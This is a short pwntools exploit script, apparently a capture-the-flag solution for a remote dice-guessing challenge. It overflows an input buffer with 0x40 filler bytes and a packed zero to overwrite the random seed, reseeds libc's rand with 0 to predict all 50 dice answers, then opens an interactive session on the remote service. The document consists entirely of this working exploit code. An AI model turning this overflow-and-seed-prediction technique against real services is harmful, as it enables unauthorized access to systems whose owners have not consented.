from pwn import *
from ctypes import *

r=remote('111.198.29.45',36404)

libc=cdll.LoadLibrary('libc.so.6')

payload='a'*0x40+p64(0)

r.sendline(payload)

libc.srand(0)

for i in range(50):
	r.recvuntil('Give me the point(1~6):')

	r.sendline(str(libc.rand()%6+1))

r.interactive()
